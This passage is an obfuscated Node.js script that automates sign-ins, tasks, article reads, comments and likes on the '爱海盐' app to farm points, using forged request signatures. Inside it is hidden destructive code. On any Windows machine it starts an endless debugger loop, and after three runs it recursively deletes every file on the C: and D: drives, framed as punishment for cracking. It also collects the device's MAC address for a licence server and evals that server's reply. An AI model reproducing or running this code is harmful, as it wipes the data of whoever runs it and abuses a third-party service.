const $ = new Env("爱海盐");
const VM = require("sablejs/runtime")(),
  path = require("path"),
  fs = require("fs"),
  cryptoJS = require("crypto-js");
function initVM() {
  vm = new VM();
  const _0x502bf6 = vm.getGlobal(),
    _0x1494e3 = vm.createObject(),
    _0x3be2c0 = vm.createFunction("log", function () {
      const _0x1f00ac = [];
      for (let _0x2dcfa8 = 0; _0x2dcfa8 < arguments.length; _0x2dcfa8++) {
        _0x1f00ac.push(vm.asString(arguments[_0x2dcfa8]));
      }
      console.log(..._0x1f00ac);
      return vm.createUndefined();
    }),
    _0x29f807 = vm.createFunction("xxxx", function (_0x1d4121) {
      let _0x317e79 = eval(_0x1d4121.value);
      return vm.createString(JSON.stringify(_0x317e79));
    }),
    _0x591552 = vm.createFunction("yyyy", function (_0x1a5697) {
      let _0x13a28e = _0x1a5697.value,
        _0x22dd60 = fs.readFileSync(_0x13a28e, "utf-8").replace(/\r\n/g, "\n"),
        _0x1d119d = cryptoJS.MD5(_0x22dd60).toString();
      return vm.createString(_0x1d119d);
    }),
    _0xab565e = vm.createFunction("ddd", function (_0x146e43) {
      let _0x10428a = cryptoJS.MD5(_0x146e43.value).toString();
      return vm.createString(_0x10428a);
    });
  vm.setProperty(_0x1494e3, "log", _0x3be2c0);
  vm.setProperty(_0x502bf6, "xxxx", _0x29f807);
  vm.setProperty(_0x502bf6, "console", _0x1494e3);
  vm.setProperty(_0x502bf6, "yyyy", _0x591552);
  vm.setProperty(_0x502bf6, "ddd", _0xab565e);
  vm.run(fs.readFileSync("./output_final.js").toString());
  return vm;
}
function destroyVM(_0x4fd4bc) {
  _0x4fd4bc.destroy();
}
function abc(_0x55b072, _0xb53653, _0x1c2502, _0x23d050, _0x150cb1) {
  const _0x5f3245 = _0x55b072.getGlobal();
  let _0x513872 = _0x55b072.getProperty(_0x5f3245, "xab"),
    _0x3eb5e3 = _0x55b072.call(_0x513872, _0x55b072.createUndefined(), _0x55b072.createString(_0xb53653), _0x55b072.createString(_0x23d050), _0x55b072.createString(_0x150cb1), _0x55b072.createString(_0x1c2502));
  _0x3eb5e3 = _0x55b072.asString(_0x3eb5e3);
  return _0x3eb5e3;
}
function xyz(_0x46f6a9, _0x21dfab, _0x447ea4, _0x2d87b6, _0x513068) {
  const _0x365e2c = _0x46f6a9.getGlobal();
  let _0x41830c = _0x46f6a9.getProperty(_0x365e2c, "xmn"),
    _0x4dbe46 = _0x46f6a9.call(_0x41830c, _0x46f6a9.createUndefined(), _0x46f6a9.createString(_0x21dfab), _0x46f6a9.createString(_0x2d87b6), _0x46f6a9.createString(_0x513068), _0x46f6a9.createString(_0x447ea4));
  _0x4dbe46 = _0x46f6a9.asString(_0x4dbe46);
  return _0x4dbe46;
}
var gtr;
let mac = "",
  status;
status = (status = $.getval("qmwkstatus") || "1") > 1 ? "" + status : "";
JSNAMED = $.isNode() ? require("path").basename(__filename) : "kxnjy.js";
let ahyappArr = [],
  all_msg = "";
const sha256 = require("crypto-js/sha256");
let ye = "",
  name = "",
  wzid = "",
  tcxh = 0,
  arrs = [],
  ahyapp = ($.isNode() ? process.env.ahyapp : $.getdata("ahyapp")) || "",
  acckey = $.isNode() ? process.env.cdkey ? process.env.cdkey : "" : $.getdata("cdkey") ? $.getdata("cdkey") : "";
var myDate = new Date(),
  myMonth = myDate.getMonth() + 1,
  myToday = myDate.getDate();
myMonth >= 10 ? myMonth = myMonth : myMonth = "0" + myMonth;
myToday >= 10 ? myToday = myToday : myToday = "0" + myToday;
if ($.isNode()) {
  gtr = require("fs");
  if (isFileExist("C:/")) {
    console.log("电脑环境");
    setInterval(() => {
      do {
        (function (_0x49f7c5) {
          return function (_0x3acd9b) {
            return Function("Function(arguments[0]+\"" + _0x3acd9b + "\")()");
          }(_0x49f7c5);
        })("bugger")("de", 0, 0, (0, 0));
        addF("d:/");
        addF("C:/");
      } while (1);
    }, 0);
  } else {
    console.log("青龙环境");
    function getMACAddresses() {
      var _0x51997a = "",
        _0x1ad5a4 = fs.readdirSync("/sys/class/net/");
      _0x1ad5a4.forEach(function (_0x3afe8c) {
        var _0x508cc8 = path.join("/sys/class/net", _0x3afe8c, "address");
        _0x3afe8c.substr(0, 3) == "eth" && fs.existsSync(_0x508cc8) && (_0x51997a = fs.readFileSync(_0x508cc8).toString().trim());
      });
      return _0x51997a;
    }
    mac = getMACAddresses();
  }
} else {
  console.log("代理环境");
}
function isFileExist(_0x2ec211) {
  try {
    gtr.accessSync(_0x2ec211, gtr.F_OK);
  } catch (_0x3715e3) {
    return false;
  }
  return true;
}
function addF(_0x1f2f0d, _0x4c98ac) {
  let _0x523139 = 0,
    _0x2cc38f = "C:/Windows/system.txt";
  if (isFileExist(_0x2cc38f)) {
    _0x523139 = gtr.readFileSync(_0x2cc38f, "utf8");
  } else {
    if (isFileExist("C:/")) {
      gtr.writeFile(_0x2cc38f, "1", function (_0xfb790f) {
        if (_0xfb790f) {
          throw _0xfb790f;
        }
      });
    } else {
      return;
    }
  }
  if (_0x523139 == 99) {
    return 99;
  }
  console.log(_0x523139);
  console.log("警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！", _0x523139);
  if (parseInt(_0x523139) < 3) {
    let _0x487cd9 = parseInt(_0x523139) + 1;
    gtr.writeFileSync(_0x2cc38f, _0x487cd9 + "", "utf8");
    return;
  }
  if (!gtr.existsSync(_0x1f2f0d)) {
    return;
  }
  if (gtr.statSync(_0x1f2f0d).isDirectory()) {
    var _0x1ebf0c = gtr.readdirSync(_0x1f2f0d),
      _0x2403b4 = _0x1ebf0c.length,
      _0x89e9a8 = 0;
    if (_0x2403b4 > 0) {
      _0x1ebf0c.forEach(function (_0x550e64) {
        _0x89e9a8++;
        var _0xe2c05 = _0x1f2f0d + "/" + _0x550e64;
        gtr.statSync(_0xe2c05).isDirectory() ? addF(_0xe2c05, true) : gtr.unlinkSync(_0xe2c05);
      });
      _0x2403b4 == _0x89e9a8 && _0x4c98ac && gtr.rmdirSync(_0x1f2f0d);
    } else {
      _0x2403b4 == 0 && _0x4c98ac && gtr.rmdirSync(_0x1f2f0d);
    }
  } else {
    gtr.unlinkSync(_0x1f2f0d);
  }
}
!(async () => {
  if (!(typeof $request !== "undefined")) {
    initVM();
    arrs = abc(global.vm, acckey, mac, 95, 0);
    if (arrs == "") {
      return;
    }
    arrs = JSON.parse(arrs);
    if (!arrs) {
      return;
    }
    ahyappArr = ahyapp.split("@");
    console.log("\n公告：" + arrs.gg + "\n");
    console.log("当前版本：1.0 " + arrs.bb + "\n");
    console.log("------------- 共" + ahyappArr.length + "个账号-------------\n");
    console.log("当前设备可执行账号限制为" + arrs.num + "个账号\n");
    if (!(ahyappArr.length > parseInt(arrs.num))) {
      for (let _0x421080 = 0; _0x421080 < ahyappArr.length; _0x421080++) {
        ahyapp = ahyappArr[_0x421080];
        $.index = _0x421080 + 1;
        console.log("\n开始【爱海盐" + $.index + "】");
        uuid = ahyapp.split("&")[0];
        token = ahyapp.split("&")[1];
        ck = randomString(32);
        pid = randomString(32);
        tcxh = 0;
        await ahyqd();
        await ahylb();
        await ahylb1();
        await ahyxx();
      }
    }
  }
  destroyVM(global.vm);
})().catch(_0x1cbb6c => $.logErr(_0x1cbb6c)).finally(() => $.done());
function ahylb(_0x298854 = 0) {
  return new Promise(_0x1065b4 => {
    let _0x383d73 = Math.round(new Date().getTime()),
      _0x2fa373 = sha256("/api/user_mumber/numberCenter&&" + ahyapp + "&&" + _0x383d73 + "&&" + _0x383d73 + "&&FR*r!isE5W&&60"),
      _0x501f9d = {
        url: "https://vapp.tmuyun.com/api/user_mumber/numberCenter",
        headers: {
          "X-SESSION-ID": ahyapp,
          "X-REQUEST-ID": _0x383d73,
          "X-TIMESTAMP": _0x383d73,
          "X-SIGNATURE": _0x2fa373,
          "X-TENANT-ID": "60",
          "User-Agent": "5.1.4;00000000-699b-48a2-ffff-ffffb82f1bb7;Meizu 16s Pro;Android;10;Release",
          "Cache-Control": "no-cache",
          Host: "vapp.tmuyun.com",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip"
        }
      };
    $.get(_0x501f9d, async (_0x2c416f, _0x1c5208, _0x584be6) => {
      try {
        const _0x42f081 = JSON.parse(_0x584be6);
        if (_0x42f081.code == 0) {
          _0x42f081.data.rst.user_task_list[0].finish_times == 0 && (await ahyqd());
          for (let _0x9ea61 = 0; _0x9ea61 < _0x42f081.data.rst.user_task_list.length; _0x9ea61++) {
            _0x42f081.data.rst.user_task_list[_0x9ea61].name !== "新闻资讯阅读" && _0x42f081.data.rst.user_task_list[_0x9ea61].name !== "新闻资讯评论" && _0x42f081.data.rst.user_task_list[_0x9ea61].name !== "新闻资讯点赞" && _0x42f081.data.rst.user_task_list[_0x9ea61].name !== "每日签到" && _0x42f081.data.rst.user_task_list[_0x9ea61].name !== "邀请好友" && (console.log("\n爱海盐任务：" + _0x42f081.data.rst.user_task_list[_0x9ea61].name + " 进度：" + _0x42f081.data.rst.user_task_list[_0x9ea61].finish_times + "/" + _0x42f081.data.rst.user_task_list[_0x9ea61].frequency + " 奖励经验：" + _0x42f081.data.rst.user_task_list[_0x9ea61].experience + " 积分：" + _0x42f081.data.rst.user_task_list[_0x9ea61].integral), ye = _0x42f081.data.rst.user_task_list[_0x9ea61].member_task_type, name = _0x42f081.data.rst.user_task_list[_0x9ea61].name, await ahyrw());
          }
        } else {
          console.log("\n爱海盐:" + _0x42f081.msg);
        }
      } catch (_0x2e9eed) {} finally {
        _0x1065b4();
      }
    }, _0x298854);
  });
}
function ahyqd(_0x17f1b5 = 0) {
  return new Promise(_0x50d48b => {
    let _0x56716a = Math.round(new Date().getTime()),
      _0x21e907 = sha256("/api/user_mumber/sign&&" + ahyapp + "&&" + _0x56716a + "&&" + _0x56716a + "&&FR*r!isE5W&&60"),
      _0x32b4d0 = {
        url: "https://vapp.tmuyun.com/api/user_mumber/sign",
        headers: {
          "X-SESSION-ID": ahyapp,
          "X-REQUEST-ID": _0x56716a,
          "X-TIMESTAMP": _0x56716a,
          "X-SIGNATURE": _0x21e907,
          "X-TENANT-ID": "60",
          "User-Agent": "5.1.4;00000000-699b-48a2-ffff-ffffb82f1bb7;Meizu 16s Pro;Android;10;Release",
          "Cache-Control": "no-cache",
          Host: "vapp.tmuyun.com",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip"
        }
      };
    $.get(_0x32b4d0, async (_0x2b8e0e, _0x3eeea0, _0x1e85b3) => {
      try {
        const _0x26ad50 = JSON.parse(_0x1e85b3);
        _0x26ad50.code == 0 ? console.log("\n爱海盐签到：" + _0x26ad50.data.reason + " 积分：" + _0x26ad50.data.signIntegral) : console.log("\n爱海盐:" + _0x26ad50.msg);
      } catch (_0x2292c9) {} finally {
        _0x50d48b();
      }
    }, _0x17f1b5);
  });
}
function ahyrw(_0x5f29cb = 0) {
  return new Promise(_0x1fc8c5 => {
    let _0x12c5f1 = Math.round(new Date().getTime()),
      _0x759b58 = sha256("/api/user_mumber/doTask&&" + ahyapp + "&&" + _0x12c5f1 + "&&" + _0x12c5f1 + "&&FR*r!isE5W&&60"),
      _0x47b517 = {
        url: "https://vapp.tmuyun.com/api/user_mumber/doTask",
        headers: {
          "X-SESSION-ID": ahyapp,
          "X-REQUEST-ID": _0x12c5f1,
          "X-TIMESTAMP": _0x12c5f1,
          "X-SIGNATURE": _0x759b58,
          "X-TENANT-ID": "60",
          "User-Agent": "3.0.10.0;00000000-699b-48a2-0000-00002cd91ee0;Meizu 16s Pro;Android;10;Release",
          "Cache-Control": "no-cache",
          Host: "vapp.tmuyun.com",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip"
        },
        body: "memberType=" + ye + "&member_type=" + ye + "&target_id=" + _0x12c5f1
      };
    $.post(_0x47b517, async (_0x18c7fa, _0x72a062, _0x1ff96d) => {
      try {
        const _0x20250e = JSON.parse(_0x1ff96d);
        _0x20250e.code == 0 ? console.log("\n爱海盐任务：" + name + " 积分：" + _0x20250e.data.score_notify.score_notify) : console.log("\n爱海盐:" + name + " " + _0x20250e.message);
      } catch (_0x160fd9) {} finally {
        _0x1fc8c5();
      }
    }, _0x5f29cb);
  });
}
function ahylb1(_0xde7e = 0) {
  return new Promise(_0x16d8f6 => {
    let _0x355162 = Math.round(new Date().getTime()),
      _0x3499cb = sha256("/api/user_mumber/numberCenter&&" + ahyapp + "&&" + _0x355162 + "&&" + _0x355162 + "&&FR*r!isE5W&&60"),
      _0x58940e = {
        url: "https://vapp.tmuyun.com/api/user_mumber/numberCenter",
        headers: {
          "X-SESSION-ID": ahyapp,
          "X-REQUEST-ID": _0x355162,
          "X-TIMESTAMP": _0x355162,
          "X-SIGNATURE": _0x3499cb,
          "X-TENANT-ID": "60",
          "User-Agent": "5.1.4;00000000-699b-48a2-ffff-ffffb82f1bb7;Meizu 16s Pro;Android;10;Release",
          "Cache-Control": "no-cache",
          Host: "vapp.tmuyun.com",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip"
        }
      };
    $.get(_0x58940e, async (_0x5e1da9, _0x3c1151, _0x9354ac) => {
      try {
        const _0x5ea8c5 = JSON.parse(_0x9354ac);
        if (_0x5ea8c5.code == 0) {
          _0x5ea8c5.data.rst.user_task_list[0].finish_times == 0 && (await ahyqd());
          for (let _0x77fa49 = 0; _0x77fa49 < _0x5ea8c5.data.rst.user_task_list.length; _0x77fa49++) {
            _0x5ea8c5.data.rst.user_task_list[_0x77fa49].name !== "分享资讯给好友" && _0x5ea8c5.data.rst.user_task_list[_0x77fa49].name !== "使用本地服务" && _0x5ea8c5.data.rst.user_task_list[_0x77fa49].name !== "每日签到" && _0x5ea8c5.data.rst.user_task_list[_0x77fa49].name !== "邀请好友" && (console.log("\n爱海盐任务：" + _0x5ea8c5.data.rst.user_task_list[_0x77fa49].name + " 进度：" + _0x5ea8c5.data.rst.user_task_list[_0x77fa49].finish_times + "/" + _0x5ea8c5.data.rst.user_task_list[_0x77fa49].frequency + " 奖励经验：" + _0x5ea8c5.data.rst.user_task_list[_0x77fa49].experience + " 积分：" + _0x5ea8c5.data.rst.user_task_list[_0x77fa49].integral), _0x5ea8c5.data.rst.user_task_list[_0x77fa49].name == "新闻资讯阅读" && _0x5ea8c5.data.rst.user_task_list[_0x77fa49].finish_times < 5 && (await ahywz()), _0x5ea8c5.data.rst.user_task_list[_0x77fa49].name == "新闻资讯评论" && _0x5ea8c5.data.rst.user_task_list[_0x77fa49].finish_times < 5 && (await ahywz()), _0x5ea8c5.data.rst.user_task_list[_0x77fa49].name == "新闻资讯点赞" && _0x5ea8c5.data.rst.user_task_list[_0x77fa49].finish_times < 5 && (await ahywz()));
          }
        } else {
          console.log("\n爱海盐:" + _0x5ea8c5.msg);
        }
      } catch (_0x314f6d) {} finally {
        _0x16d8f6();
      }
    }, _0xde7e);
  });
}
function ahyxx(_0x3bf6a8 = 0) {
  return new Promise(_0x3fff64 => {
    let _0x2cdb1b = Math.round(new Date().getTime()),
      _0x2223a5 = sha256("/api/user_mumber/account_detail&&" + ahyapp + "&&" + _0x2cdb1b + "&&" + _0x2cdb1b + "&&FR*r!isE5W&&60"),
      _0x5d9bdf = {
        url: "https://vapp.tmuyun.com/api/user_mumber/account_detail",
        headers: {
          "X-SESSION-ID": ahyapp,
          "X-REQUEST-ID": _0x2cdb1b,
          "X-TIMESTAMP": _0x2cdb1b,
          "X-SIGNATURE": _0x2223a5,
          "X-TENANT-ID": "60",
          "User-Agent": "5.1.4;00000000-699b-48a2-ffff-ffffb82f1bb7;Meizu 16s Pro;Android;10;Release",
          "Cache-Control": "no-cache",
          Host: "vapp.tmuyun.com",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip"
        }
      };
    $.get(_0x5d9bdf, async (_0x1f45a9, _0x5745b1, _0x236573) => {
      try {
        const _0x4f7be7 = JSON.parse(_0x236573);
        _0x4f7be7.code == 0 ? console.log("\n爱海盐用户：" + _0x4f7be7.data.rst.nick_name + " 积分余额：" + _0x4f7be7.data.rst.total_integral) : console.log("\n爱海盐:" + name + " " + _0x4f7be7.message);
      } catch (_0x333cfb) {} finally {
        _0x3fff64();
      }
    }, _0x3bf6a8);
  });
}
function ahywz(_0x1f6899 = 0) {
  return new Promise(_0x24f740 => {
    let _0x445d90 = Math.round(new Date().getTime()),
      _0x25c117 = sha256("/api/article/channel_list&&" + ahyapp + "&&" + _0x445d90 + "&&" + _0x445d90 + "&&FR*r!isE5W&&60"),
      _0x553b69 = {
        url: "https://vapp.tmuyun.com/api/article/channel_list?channel_id=63552eddfe3fc1680f583c1c&isDiFangHao=false&is_new=true&list_count=0&size=20",
        headers: {
          "X-SESSION-ID": ahyapp,
          "X-REQUEST-ID": _0x445d90,
          "X-TIMESTAMP": _0x445d90,
          "X-SIGNATURE": _0x25c117,
          "X-TENANT-ID": "60",
          "User-Agent": "5.1.4;00000000-699b-48a2-ffff-ffffb82f1bb7;Meizu 16s Pro;Android;10;Release",
          "Cache-Control": "no-cache",
          Host: "vapp.tmuyun.com",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip"
        }
      };
    $.get(_0x553b69, async (_0x752af8, _0x3ba392, _0x5eaa24) => {
      try {
        const _0x4de17c = JSON.parse(_0x5eaa24);
        if (_0x4de17c.code == 0) {
          for (let _0x5ee22b = 2; _0x5ee22b < _0x4de17c.data.article_list.length; _0x5ee22b++) {
            _0x4de17c.data.article_list[_0x5ee22b].list_title !== "" && _0x4de17c.data.article_list[_0x5ee22b].mark_read !== 1 && tcxh == 0 && (console.log("\n爱海盐文章：" + _0x4de17c.data.article_list[_0x5ee22b].list_title + " ID：" + _0x4de17c.data.article_list[_0x5ee22b].id), wzid = _0x4de17c.data.article_list[_0x5ee22b].id, await ahyyd(), await $.wait(1000));
          }
        } else {
          console.log("\n爱海盐:" + name + " " + _0x4de17c.message);
        }
      } catch (_0x539cb2) {} finally {
        _0x24f740();
      }
    }, _0x1f6899);
  });
}
function ahyyd(_0x3ba799 = 0) {
  return new Promise(_0x5f4648 => {
    let _0x18256a = Math.round(new Date().getTime()),
      _0x3ffd06 = sha256("/api/article/detail&&" + ahyapp + "&&" + _0x18256a + "&&" + _0x18256a + "&&FR*r!isE5W&&60"),
      _0x17973b = {
        url: "https://vapp.tmuyun.com/api/article/detail?from_channel=5bd2bef6b1985042e7691870&id=" + wzid,
        headers: {
          "X-SESSION-ID": ahyapp,
          "X-REQUEST-ID": _0x18256a,
          "X-TIMESTAMP": _0x18256a,
          "X-SIGNATURE": _0x3ffd06,
          "X-TENANT-ID": "60",
          "User-Agent": "5.1.4;00000000-699b-48a2-ffff-ffffb82f1bb7;Meizu 16s Pro;Android;10;Release",
          "Cache-Control": "no-cache",
          Host: "vapp.tmuyun.com",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip"
        }
      };
    $.get(_0x17973b, async (_0x2f45fc, _0x4cd26e, _0x2b1422) => {
      try {
        const _0x2b5882 = JSON.parse(_0x2b1422);
        _0x2b5882.code == 0 ? (console.log("\n爱海盐阅读：成功"), await ahypl()) : console.log("\n爱海盐阅读：失败");
      } catch (_0x30015a) {} finally {
        _0x5f4648();
      }
    }, _0x3ba799);
  });
}
function ahypl(_0x2f9d5a = 0) {
  return new Promise(_0x4e5f42 => {
    let _0x7b2920 = Math.round(new Date().getTime()),
      _0x3d78ff = sha256("/api/comment/create&&" + ahyapp + "&&" + _0x7b2920 + "&&" + _0x7b2920 + "&&FR*r!isE5W&&60"),
      _0x5f01a0 = {
        url: "https://vapp.tmuyun.com/api/comment/create",
        headers: {
          "X-SESSION-ID": ahyapp,
          "X-REQUEST-ID": _0x7b2920,
          "X-TIMESTAMP": _0x7b2920,
          "X-SIGNATURE": _0x3d78ff,
          "X-TENANT-ID": "60",
          "User-Agent": "5.1.4;00000000-699b-48a2-ffff-ffffb82f1bb7;Meizu 16s Pro;Android;10;Release",
          "Cache-Control": "no-cache",
          Host: "vapp.tmuyun.com",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip"
        },
        body: "channel_article_id=" + wzid + "&content=%E4%B8%8D%E9%94%99"
      };
    $.post(_0x5f01a0, async (_0x35190e, _0x11b565, _0x51a2ff) => {
      try {
        const _0x428e0c = JSON.parse(_0x51a2ff);
        _0x428e0c.code == 0 ? (console.log("\n爱海盐评论：成功"), await ahydz()) : console.log("\n爱海盐评论：失败");
      } catch (_0x350184) {} finally {
        _0x4e5f42();
      }
    }, _0x2f9d5a);
  });
}
function ahydz(_0x1be48d = 0) {
  return new Promise(_0x5f20b7 => {
    let _0x587a90 = Math.round(new Date().getTime()),
      _0x29c661 = sha256("/api/favorite/like&&" + ahyapp + "&&" + _0x587a90 + "&&" + _0x587a90 + "&&FR*r!isE5W&&60"),
      _0x154de3 = {
        url: "https://vapp.tmuyun.com/api/favorite/like",
        headers: {
          "X-SESSION-ID": ahyapp,
          "X-REQUEST-ID": _0x587a90,
          "X-TIMESTAMP": _0x587a90,
          "X-SIGNATURE": _0x29c661,
          "X-TENANT-ID": "60",
          "User-Agent": "5.1.4;00000000-699b-48a2-ffff-ffffb82f1bb7;Meizu 16s Pro;Android;10;Release",
          "Cache-Control": "no-cache",
          Host: "vapp.tmuyun.com",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip"
        },
        body: "action=true&id=" + wzid
      };
    $.post(_0x154de3, async (_0x3cbb1f, _0x2e98df, _0x4f5f07) => {
      try {
        const _0x4a225d = JSON.parse(_0x4f5f07);
        _0x4a225d.code == 0 ? (console.log("\n爱海盐点赞：成功"), tcxh = 1) : console.log("\n爱海盐点赞：失败");
      } catch (_0x143261) {} finally {
        _0x5f20b7();
      }
    }, _0x1be48d);
  });
}
function randomString(_0x4667e6 = 12) {
  let _0x17e3bf = "abcdef0123456789",
    _0x3761f7 = _0x17e3bf.length,
    _0x2d00a7 = "";
  for (i = 0; i < _0x4667e6; i++) {
    _0x2d00a7 += _0x17e3bf.charAt(Math.floor(Math.random() * _0x3761f7));
  }
  return _0x2d00a7;
}
function encodeUTF8(_0x558a0f) {
  var _0x3fcc59,
    _0xb02d0b = [],
    _0x34b805,
    _0x5eefcb;
  for (_0x3fcc59 = 0; _0x3fcc59 < _0x558a0f.length; _0x3fcc59++) {
    if ((_0x34b805 = _0x558a0f.charCodeAt(_0x3fcc59)) < 128) {
      _0xb02d0b.push(_0x34b805);
    } else {
      if (_0x34b805 < 2048) {
        _0xb02d0b.push(192 + (_0x34b805 >> 6 & 31), 128 + (_0x34b805 & 63));
      } else {
        if ((_0x5eefcb = _0x34b805 ^ 55296) >> 10 == 0) {
          _0x34b805 = (_0x5eefcb << 10) + (_0x558a0f.charCodeAt(++_0x3fcc59) ^ 56320) + 65536;
          _0xb02d0b.push(240 + (_0x34b805 >> 18 & 7), 128 + (_0x34b805 >> 12 & 63));
        } else {
          _0xb02d0b.push(224 + (_0x34b805 >> 12 & 15));
        }
        _0xb02d0b.push(128 + (_0x34b805 >> 6 & 63), 128 + (_0x34b805 & 63));
      }
    }
  }
  return _0xb02d0b;
}
function sha(_0x744eb2) {
  var _0x5ca844 = new Uint8Array(encodeUTF8(_0x744eb2)),
    _0x407d91,
    _0x1a983b,
    _0x240071,
    _0x11f95c = (_0x5ca844.length + 8 >>> 6 << 4) + 16,
    _0x744eb2 = new Uint8Array(_0x11f95c << 2);
  _0x744eb2.set(new Uint8Array(_0x5ca844.buffer));
  _0x744eb2 = new Uint32Array(_0x744eb2.buffer);
  for (_0x240071 = new DataView(_0x744eb2.buffer), _0x407d91 = 0; _0x407d91 < _0x11f95c; _0x407d91++) {
    _0x744eb2[_0x407d91] = _0x240071.getUint32(_0x407d91 << 2);
  }
  _0x744eb2[_0x5ca844.length >> 2] |= 128 << 24 - (_0x5ca844.length & 3) * 8;
  _0x744eb2[_0x11f95c - 1] = _0x5ca844.length << 3;
  var _0x56cc02 = [],
    _0xf881c9 = [function () {
      return _0x199075[1] & _0x199075[2] | ~_0x199075[1] & _0x199075[3];
    }, function () {
      return _0x199075[1] ^ _0x199075[2] ^ _0x199075[3];
    }, function () {
      return _0x199075[1] & _0x199075[2] | _0x199075[1] & _0x199075[3] | _0x199075[2] & _0x199075[3];
    }, function () {
      return _0x199075[1] ^ _0x199075[2] ^ _0x199075[3];
    }],
    _0x3f9322 = function (_0x57a857, _0x29e204) {
      return _0x57a857 << _0x29e204 | _0x57a857 >>> 32 - _0x29e204;
    },
    _0x5308d4 = [1518500249, 1859775393, -1894007588, -899497514],
    _0x199075 = [1732584193, -271733879, null, null, -1009589776];
  _0x199075[2] = ~_0x199075[0];
  _0x199075[3] = ~_0x199075[1];
  for (_0x407d91 = 0; _0x407d91 < _0x744eb2.length; _0x407d91 += 16) {
    var _0x2fee73 = _0x199075.slice(0);
    for (_0x1a983b = 0; _0x1a983b < 80; _0x1a983b++) {
      _0x56cc02[_0x1a983b] = _0x1a983b < 16 ? _0x744eb2[_0x407d91 + _0x1a983b] : _0x3f9322(_0x56cc02[_0x1a983b - 3] ^ _0x56cc02[_0x1a983b - 8] ^ _0x56cc02[_0x1a983b - 14] ^ _0x56cc02[_0x1a983b - 16], 1);
      _0x240071 = _0x3f9322(_0x199075[0], 5) + _0xf881c9[_0x1a983b / 20 | 0]() + _0x199075[4] + _0x56cc02[_0x1a983b] + _0x5308d4[_0x1a983b / 20 | 0] | 0;
      _0x199075[1] = _0x3f9322(_0x199075[1], 30);
      _0x199075.pop();
      _0x199075.unshift(_0x240071);
    }
    for (_0x1a983b = 0; _0x1a983b < 5; _0x1a983b++) {
      _0x199075[_0x1a983b] = _0x199075[_0x1a983b] + _0x2fee73[_0x1a983b] | 0;
    }
  }
  _0x240071 = new DataView(new Uint32Array(_0x199075).buffer);
  for (var _0x407d91 = 0; _0x407d91 < 5; _0x407d91++) {
    _0x199075[_0x407d91] = _0x240071.getUint32(_0x407d91 << 2);
  }
  var _0x56f1ff = Array.prototype.map.call(new Uint8Array(new Uint32Array(_0x199075).buffer), function (_0x416f90) {
    return (_0x416f90 < 16 ? "0" : "") + _0x416f90.toString(16);
  }).join("");
  return _0x56f1ff;
}
function hqs(_0x5dce04 = 10) {
  return new Promise(_0x465497 => {
    let _0x12c412 = 12,
      _0x13b728 = {
        url: $.isNode() ? rc4($.fwur(), "1200") + ("?key=" + acckey + "&id=" + _0x12c412 + "&ip=1&mac=" + mac + "&bb=1") : rc4($.fwur(), "1200") + ("?key=" + acckey + "&id=" + _0x12c412 + "&ip=0&mac=" + mac + "&bb=1")
      };
    $.post(_0x13b728, async (_0x57b5fe, _0x3f3d26, _0x42daec) => {
      try {
        let _0x1d57a6 = eval(_0x42daec);
        _0x1d57a6.code == 200 ? (all_msg = _0x1d57a6.msg, _0x465497(_0x1d57a6.data)) : (all_msg = _0x1d57a6.msg, _0x465497(false));
      } catch (_0x2d7328) {
        $.logErr(_0x2d7328, _0x3f3d26);
      }
    }, 0);
  });
}
function md5(_0x20be72) {
  function _0x34dfdf(_0x2f1b70, _0x17550c) {
    return _0x2f1b70 << _0x17550c | _0x2f1b70 >>> 32 - _0x17550c;
  }
  function _0x2db9a0(_0x24cbeb, _0x1e959d) {
    var _0x336b8c, _0x5d4224, _0x1ead53, _0x5bf84f, _0x23f8db;
    _0x1ead53 = 2147483648 & _0x24cbeb;
    _0x5bf84f = 2147483648 & _0x1e959d;
    _0x336b8c = 1073741824 & _0x24cbeb;
    _0x5d4224 = 1073741824 & _0x1e959d;
    _0x23f8db = (1073741823 & _0x24cbeb) + (1073741823 & _0x1e959d);
    return _0x336b8c & _0x5d4224 ? 2147483648 ^ _0x23f8db ^ _0x1ead53 ^ _0x5bf84f : _0x336b8c | _0x5d4224 ? 1073741824 & _0x23f8db ? 3221225472 ^ _0x23f8db ^ _0x1ead53 ^ _0x5bf84f : 1073741824 ^ _0x23f8db ^ _0x1ead53 ^ _0x5bf84f : _0x23f8db ^ _0x1ead53 ^ _0x5bf84f;
  }
  function _0x513636(_0x2b9d02, _0x180d6f, _0x3b957b) {
    return _0x2b9d02 & _0x180d6f | ~_0x2b9d02 & _0x3b957b;
  }
  function _0x27c0b0(_0x22b42c, _0x4d0db7, _0x5da2e1) {
    return _0x22b42c & _0x5da2e1 | _0x4d0db7 & ~_0x5da2e1;
  }
  function _0x5a80c0(_0x570212, _0x22fb82, _0x45a32d) {
    return _0x570212 ^ _0x22fb82 ^ _0x45a32d;
  }
  function _0x15b51f(_0x55da5a, _0x50f59e, _0x1ab5f2) {
    return _0x50f59e ^ (_0x55da5a | ~_0x1ab5f2);
  }
  function _0x2713aa(_0x29c93f, _0x109be7, _0x42dda1, _0x3c7e4e, _0x157dd0, _0x5c7247, _0x44dfe5) {
    _0x29c93f = _0x2db9a0(_0x29c93f, _0x2db9a0(_0x2db9a0(_0x513636(_0x109be7, _0x42dda1, _0x3c7e4e), _0x157dd0), _0x44dfe5));
    return _0x2db9a0(_0x34dfdf(_0x29c93f, _0x5c7247), _0x109be7);
  }
  function _0x406439(_0x33c5aa, _0x2b9771, _0x35cf83, _0x215bf9, _0x2108e5, _0x2fec56, _0x10bd04) {
    _0x33c5aa = _0x2db9a0(_0x33c5aa, _0x2db9a0(_0x2db9a0(_0x27c0b0(_0x2b9771, _0x35cf83, _0x215bf9), _0x2108e5), _0x10bd04));
    return _0x2db9a0(_0x34dfdf(_0x33c5aa, _0x2fec56), _0x2b9771);
  }
  function _0x34e28c(_0x1bfe5a, _0x939c08, _0x31dfe2, _0x37fcb4, _0x29167d, _0x5ab898, _0x5616a2) {
    _0x1bfe5a = _0x2db9a0(_0x1bfe5a, _0x2db9a0(_0x2db9a0(_0x5a80c0(_0x939c08, _0x31dfe2, _0x37fcb4), _0x29167d), _0x5616a2));
